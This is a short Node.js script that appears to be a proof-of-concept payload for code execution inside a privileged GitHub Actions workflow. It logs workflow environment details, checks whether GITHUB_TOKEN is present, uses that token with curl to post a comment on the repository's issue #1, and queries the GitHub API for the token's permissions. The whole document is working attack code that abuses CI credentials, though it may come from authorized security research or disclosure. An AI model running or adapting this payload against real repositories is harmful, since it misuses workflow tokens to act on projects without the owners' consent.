const fs = require('fs');
const { spawnSync } = require('child_process');
console.log('=== RCE_CONFIRMED_IN_PRIVILEGED_WORKFLOW ===');
console.log('RCE_EVENT=' + process.env.GITHUB_EVENT_NAME);
console.log('RCE_WORKFLOW=' + process.env.GITHUB_WORKFLOW);
console.log('RCE_REF=' + process.env.GITHUB_REF);
console.log('RCE_REPO=' + process.env.GITHUB_REPOSITORY);
console.log('RCE_CWD=' + process.cwd());
console.log('RCE_TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
const r = spawnSync('curl', ['-sS','-m','20','-o','/tmp/rce_comment.json','-w','%{http_code}',
  '-X','POST','-H','Authorization: Bearer ' + process.env.GITHUB_TOKEN,
  '-H','Accept: application/vnd.github+json',
  '-H','Content-Type: application/json',
  'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/1/comments',
  '-d','{"body":"RCE_TOKEN_CAN_COMMENT"}'], { encoding: 'utf8' });
console.log('RCE_COMMENT_HTTP=' + r.stdout);
try { console.log('RCE_COMMENT_BODY=' + fs.readFileSync('/tmp/rce_comment.json','utf8').slice(0,300)); } catch (e) { console.log('RCE_COMMENT_BODY_ERR=' + e.message); }
const g = spawnSync('curl', ['-sS','-m','20','-H','Authorization: Bearer ' + process.env.GITHUB_TOKEN,'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY], { encoding: 'utf8' });
try { const perms = JSON.parse(g.stdout).permissions; console.log('RCE_TOKEN_PERMISSIONS=' + JSON.stringify(perms)); } catch (e) { console.log('RCE_TOKEN_PROBE_ERR'); }
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
